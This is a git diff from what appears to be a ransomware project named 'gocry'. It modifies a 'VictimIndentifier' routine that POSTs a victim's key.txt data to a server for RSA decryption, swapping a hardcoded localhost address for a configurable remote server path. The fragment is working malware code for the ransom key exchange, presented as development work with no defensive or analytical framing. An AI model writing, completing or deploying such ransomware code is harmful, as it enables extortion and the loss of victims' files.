@@ -9,6 +9,7 @@ import (
 	"net/http"
 	"time"
 
+	"github.com/nireo/gocry/config"
 	uuid "github.com/satori/go.uuid"
 )
 
@@ -76,7 +77,8 @@ func (vi *VictimIndentifier) GetPublicIP() error {
 // GetKeyFromServer sends the key.txt data to the server and then the server
 // decrypts the data using the rsa private key.
 func (vi *VictimIndentifier) GetKeyFromServer(keyFileData []byte) ([]byte, error) {
-	req, err := http.NewRequest("POST", "http://localhost:8080/decrypt?id="+vi.UUID, bytes.NewBuffer(keyFileData))
+	req, err := http.NewRequest("POST", config.GetConfig().ServerPath+
+		"/decrypt?id="+vi.UUID, bytes.NewBuffer(keyFileData))
 	if err != nil {
 		return nil, err
 	}
